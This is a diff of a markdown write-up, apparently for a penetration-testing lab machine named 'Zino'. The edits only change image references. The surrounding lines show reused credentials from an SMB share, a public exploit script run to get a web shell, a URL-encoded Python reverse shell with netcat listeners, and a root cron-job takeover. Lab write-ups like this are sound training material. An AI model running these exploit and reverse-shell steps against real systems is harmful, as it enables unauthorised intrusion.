@@ -4,6 +4,8 @@ description: 11-10-2022
 
 # "Zino" (Intermediate)
 
+<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+
 ## Information Gathering
 
 Scanned all TCP ports:
@@ -119,13 +121,13 @@ Reconnecting with SMB1 for workgroup listing.
 
 We can access the <mark style="color:yellow;">zino</mark> share with <mark style="color:yellow;">smbclient</mark>:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
 
 * From here, I downloaded all of the files for further enumeration
 
 <mark style="color:yellow;">Misc.log</mark>:
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:yellow;">admin</mark>:<mark style="color:yellow;">adminadmin</mark>
 
@@ -145,14 +147,14 @@ python3 50594.py http://192.168.81.64:8003 admin adminadmin
 
 * A web shell was created!
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
 
 * My next goal was to establish further persistence with another reverse shell
 * However, since we are still in a web shell, we need to URL encode the reverse shell
 
 Cyber Chef:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
 
 URL-Encoded Python Reverse Shell:
 
@@ -165,7 +167,7 @@ python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF
 * Start a nc listener on Kali -- <mark style="color:red;">`nc -lnvp 3306`</mark>
 * Execute the reverse shell within the web shell and you will gain further persistence
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
 
 *   I then stabalized my shell with Python &#x20;
 
@@ -181,7 +183,7 @@ python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF
 
 * <mark style="color:yellow;">Vulnerable Cron Job running every three minutes -- It is running with root permissions as well</mark>
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
 
 * I simply removed the file -- <mark style="color:yellow;">`rm -f /var/www/html/booked/cleanup.py`</mark>
 
@@ -201,4 +203,4 @@ nc -lnvp 21
 
 ## Proofs
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
